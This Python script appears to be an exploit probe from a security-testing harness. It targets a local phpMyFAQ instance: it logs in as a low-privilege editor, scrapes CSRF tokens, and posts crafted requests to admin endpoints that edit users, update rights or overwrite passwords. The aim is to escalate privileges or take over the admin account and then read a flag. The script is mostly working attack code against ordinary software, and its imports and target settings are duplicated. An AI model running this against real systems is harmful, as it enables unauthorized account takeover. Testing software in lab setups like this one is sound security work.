#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {
    "v0": "http://127.0.0.1:40560",
    "v1": "http://127.0.0.1:40561",
}
import argparse
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import http.cookiejar
from pathlib import Path
SINK_TOKEN = {
    "/admin/api/user/overwrite-password": ("overwrite", "csrf"),
    "/admin/api/user/edit": ("updateUserData", "csrfToken"),
    "/admin/api/user/update-rights": ("updateUserRights", "csrfToken"),
}
X_ENDPOINT = "/admin/api/configuration/list/api"
EDITOR = ("editor", os.environ.get("PMF_EDITOR_PW", "EditorPass12345"))
BASE = {
    "v0": "http://127.0.0.1:40560",
    "v1": "http://127.0.0.1:40561",
}
def run_probe(candidate, *, version="v1"):
    
    base = BASE[version]
    if not isinstance(candidate, dict):
        candidate = {"endpoint": str(candidate), "json": {}, "mode": "self_escalate"}
    endpoint = candidate.get("endpoint", "/admin/api/user/edit")
    payload = dict(candidate.get("json", {}))
    mode = candidate.get("mode", "self_escalate")

    editor_id, admin_id = _reset(base)
    if editor_id <= 0:
        return {"version": version, "stage": "reset", "detail": "editor id not resolved"}

    op = _opener()
    lcode, lbody = _login(op, base, *EDITOR)
    tcode, tokens, _ = _scrape_tokens(op, base, editor_id)
    if not tokens:
        return {"version": version, "stage": "csrf", "login_status": lcode,
                "token_page_status": tcode}

    token_key, csrf_field = SINK_TOKEN.get(endpoint, ("updateUserData", "csrfToken"))
    payload[csrf_field] = tokens.get(token_key, "")
    if candidate.get("target") == "self":
        payload["userId"] = editor_id

    scode, sbody = _post_json(op, f"{base}{endpoint}", payload)

    if mode == "takeover":
        
        newpw = payload.get("newPassword", "")
        op2 = _opener()
        t2code, _ = _login(op2, base, candidate.get("takeover_login", "admin"), newpw)
        fcode, fbody = _read_flag(op2, base)
        return {"version": version, "endpoint": endpoint, "mode": mode,
                "editor_id": editor_id, "sink_status": scode, "sink_body": sbody,
                "takeover_login_status": t2code, "flag_status": fcode, "flag_body": fbody}

    
    fcode, fbody = _read_flag(op, base)
    return {"version": version, "endpoint": endpoint, "mode": mode,
            "editor_id": editor_id, "sink_status": scode, "sink_body": sbody,
            "flag_status": fcode, "flag_body": fbody}
def _post_json(opener, url, payload, **kw):
    data = json.dumps(payload).encode()
    hdr = {"Content-Type": "application/json"}
    return _req(opener, url, data=data, headers=hdr, method="POST", **kw)
def _opener():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
def _reset(base):
    
    # The real phpMyFAQ web installer runs inside the container at first boot and
    # takes several seconds after Apache is reachable; retry until the fixture
    # world (editor user + canary) is actually in place.
    for _ in range(30):
        code, body = _req(_opener(), f"{base}/pcb_reset.php", method="GET")
        try:
            j = json.loads(body)
            eid = int(j.get("editor_id", 0))
            if eid > 0:
                return eid, int(j.get("admin_id", 1))
        except Exception:  
            pass
        time.sleep(2)
    return 0, 1
def _read_flag(opener, base):
    return _req(opener, f"{base}{X_ENDPOINT}", method="GET")
def _scrape_tokens(opener, base, uid):
    
    code, html = _req(opener, f"{base}/admin/user/edit/{uid}", method="GET")
    tokens = {}
    for key, pat in (
        ("updateUserData", r'id="pmf-csrf-token"[^>]*value="([a-f0-9]{32})"'),
        ("updateUserRights", r'id="pmf-csrf-token-rights"[^>]*value="([a-f0-9]{32})"'),
        ("overwrite", r'id="modal_csrf"[^>]*?value="([a-f0-9]{32})"'),
    ):
        m = re.search(pat, html, re.DOTALL)
        if m:
            tokens[key] = m.group(1)
    return code, tokens, html
def _login(opener, base, user, password):
    
    return _post_form(opener, f"{base}/admin/authenticate",
                      {"faqusername": user, "faqpassword": password})
def _req(opener, url, data=None, headers=None, method="GET", timeout=25):
    hdrs = {"Accept-Language": "en-US,en;q=0.9"}
    hdrs.update(headers or {})
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  
        return None, f"<req-error: {e}>"
def _post_form(opener, url, fields, **kw):
    data = urllib.parse.urlencode(fields).encode()
    hdr = {"Content-Type": "application/x-www-form-urlencoded"}
    return _req(opener, url, data=data, headers=hdr, method="POST", **kw)


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))